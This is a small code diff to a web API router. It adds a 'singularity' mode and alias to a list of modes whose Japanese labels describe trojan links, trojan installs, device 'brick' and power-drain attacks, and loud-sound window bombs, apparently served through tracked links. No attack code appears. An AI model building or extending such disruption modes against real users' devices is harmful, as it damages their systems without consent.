@@ -47,9 +47,9 @@ from . import tenancy, users, linktrack
 
 router = APIRouter()
 
-MODES = ("trojan_link", "trojan_install", "max_power", "brick",
-         "windows", "storage", "mix")
-MODE_ALIAS = {"sound": "windows"}          # 旧 sound は爆音窓爆弾へ統合
+MODES = ["trojan_link", "trojan_install", "max_power", "brick",
+         "windows", "storage", "mix", "singularity"]
+MODE_ALIAS = {"sound": "windows", "sg": "singularity"}
 
 MODE_LABEL = {
     "trojan_link": "トロイの木馬（リンク型）",
